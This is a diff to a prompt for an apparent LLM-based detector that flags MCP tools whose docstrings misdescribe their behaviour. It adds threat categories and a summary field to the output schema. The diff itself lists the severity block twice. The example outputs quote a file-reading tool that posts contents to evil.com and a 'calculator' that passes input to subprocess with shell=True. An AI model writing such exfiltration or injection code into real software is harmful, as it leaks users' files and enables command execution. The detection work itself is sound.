@@ -12,7 +12,7 @@ MCP entry points (`@mcp.tool()`, `@mcp.resource()`, `@mcp.prompt()`) receive ext
 2. **Analyze the dataflow** - What does the code actually do with user input?
 3. **Compare claims vs reality** - Do they match, or is there hidden behavior?
 
-### 1. HIDDEN DATA EXFILTRATION
+### 1. DATA EXFILTRATION
 
 Detect tools that secretly transmit user data to external servers without disclosure in the docstring.
 
@@ -208,12 +208,14 @@ Respond with ONLY a valid JSON object:
 {
   "mismatch_detected": true|false,
   "severity": "HIGH|MEDIUM|LOW",
-  "mismatch_type": "description_vs_behavior",
-  "description_claims": "what the docstring says the tool does",
-  "actual_behavior": "what the code actually does based on dataflow analysis",
-  "security_implications": "why this mismatch matters - specific security risks",
   "confidence": "HIGH|MEDIUM|LOW",
-  "dataflow_evidence": "specific evidence from parameter flows showing the mismatch"
+  "summary": "Brief one-sentence description of the mismatch",
+  "threat_name": "DATA EXFILTRATION|COMMAND INJECTION|MISLEADING SAFETY CLAIMS|UNDOCUMENTED SIDE EFFECTS|PERMISSION ESCALATION",
+  "mismatch_type": "hidden_behavior|inadequate_security|undisclosed_operations|privilege_abuse",
+  "description_claims": "What the docstring says the function does",
+  "actual_behavior": "What the code actually does (with specific line references)",
+  "security_implications": "Why this is dangerous for users",
+  "dataflow_evidence": "Specific dataflow paths showing the mismatch (param → operations → sink)"
 }
 ```
 
@@ -221,7 +223,19 @@ Respond with ONLY a valid JSON object:
 
 - **mismatch_detected**: `true` only if there is a clear discrepancy between docstring and implementation
 - **severity**: 
-  - `HIGH`: Data exfiltration, command injection, critical security bypass
+  - `HIGH`: Data exfiltration, command injection, permission escalation
+  - `MEDIUM`: Misleading safety claims, undocumented side effects
+  - `LOW`: Minor discrepancies without immediate security impact
+- **confidence**: How certain you are about the mismatch
+- **summary**: Brief one-sentence description of the mismatch
+- **threat_name**: REQUIRED when mismatch_detected is true. Must be ONE of these exact values:
+  - `"DATA EXFILTRATION"` - Tool secretly transmits data to external servers
+  - `"COMMAND INJECTION"` - Tool passes user input to dangerous operations without validation
+  - `"MISLEADING SAFETY CLAIMS"` - Tool claims security but provides minimal protection
+  - `"UNDOCUMENTED SIDE EFFECTS"` - Tool performs operations not mentioned in docstring
+  - `"PERMISSION ESCALATION"` - Tool performs privileged operations beyond docstring claims
+- **severity**: 
+  - `HIGH`: Data exfiltration, command injection, permission escalation
   - `MEDIUM`: Misleading safety claims, undocumented side effects
   - `LOW`: Minor discrepancies without immediate security impact
 - **description_claims**: Quote or paraphrase what the docstring says (1 sentence)
@@ -237,11 +251,13 @@ Respond with ONLY a valid JSON object:
 {
   "mismatch_detected": true,
   "severity": "HIGH",
-  "mismatch_type": "description_vs_behavior",
+  "confidence": "HIGH",
+  "summary": "Function claims to read files locally but secretly exfiltrates contents to external server",
+  "threat_name": "DATA EXFILTRATION",
+  "mismatch_type": "hidden_behavior",
   "description_claims": "Read a file from the local filesystem",
   "actual_behavior": "Reads the file and sends its contents to an external server at evil.com",
   "security_implications": "Hidden data exfiltration - file contents are leaked to an attacker-controlled server without user knowledge or consent",
-  "confidence": "HIGH",
   "dataflow_evidence": "Parameter 'filepath' flows to open() at line 10, then content flows to requests.post('https://evil.com/exfil') at line 14"
 }
 ```
@@ -251,11 +267,13 @@ Respond with ONLY a valid JSON object:
 {
   "mismatch_detected": true,
   "severity": "HIGH",
-  "mismatch_type": "description_vs_behavior",
+  "confidence": "HIGH",
+  "summary": "Function claims to be a safe calculator but passes user input directly to shell execution",
+  "threat_name": "COMMAND INJECTION",
+  "mismatch_type": "inadequate_security",
   "description_claims": "A safe calculator that evaluates mathematical expressions",
   "actual_behavior": "Passes user input directly to shell execution via subprocess.run() with shell=True",
   "security_implications": "Arbitrary command execution vulnerability - attacker can execute any system command by injecting shell metacharacters",
-  "confidence": "HIGH",
   "dataflow_evidence": "Parameter 'expression' flows directly to subprocess.run(expression, shell=True) at line 12 without any validation or sanitization"
 }
 ```
@@ -265,12 +283,8 @@ Respond with ONLY a valid JSON object:
 {
   "mismatch_detected": false,
   "severity": "LOW",
-  "mismatch_type": "description_vs_behavior",
-  "description_claims": "",
-  "actual_behavior": "",
-  "security_implications": "",
   "confidence": "HIGH",
-  "dataflow_evidence": ""
+  "summary": ""
 }
 ```
 
